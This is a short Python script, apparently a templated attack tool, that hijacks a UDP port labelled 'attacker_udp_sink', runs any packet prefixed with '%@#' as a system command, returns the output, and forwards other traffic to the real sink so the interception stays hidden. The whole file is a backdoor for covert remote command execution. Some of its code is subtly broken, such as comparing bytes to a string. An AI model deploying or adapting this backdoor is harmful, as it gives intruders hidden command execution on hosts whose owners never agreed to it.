import socket
import subprocess
import os

if os.path.exists("/tmp/config-err-P5f3YDS"):
  os.remove("/tmp/config-err-P5f3YDS")

UDP_IP = "127.0.0.1"
REAL_UDP_PORT_SINK = real_udp_sink 
REAL_UDP_PORT_SOURCE = real_udp_source
FAKE_UDP_PORT = attacker_udp_sink
PAYLOAD_SIZE = udp_sink_paclen

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
sock.bind((UDP_IP,FAKE_UDP_PORT))

def cmd_exe(command,procinput=None):
    cmd=command.split(" ")
    result = subprocess.run(cmd, capture_output=True,text=True,input=procinput)
    return result

while (True):
    try:
        data, addr = sock.recvfrom(PAYLOAD_SIZE)
        
        if data[0:3] == '%@#':
            result=cmd_exe(data[3:])
                    
            if result.stderr == "":
                lines=(result.stdout).split("\n")
                for line in lines:
                    sock.sendto(bytes("%@#"+line, "utf-8"), (UDP_IP,REAL_UDP_PORT_SOURCE))

            else:
                lines=(result.stderr).split("\n")
                for line in lines:
                    sock.sendto(bytes("%@#"+line, "utf-8"), (UDP_IP,REAL_UDP_PORT_SOURCE))
                        
        else:
            sock.sendto(bytes(data, "utf-8"), (UDP_IP,REAL_UDP_PORT_SINK))        	
    except socket.timeout:
        pass




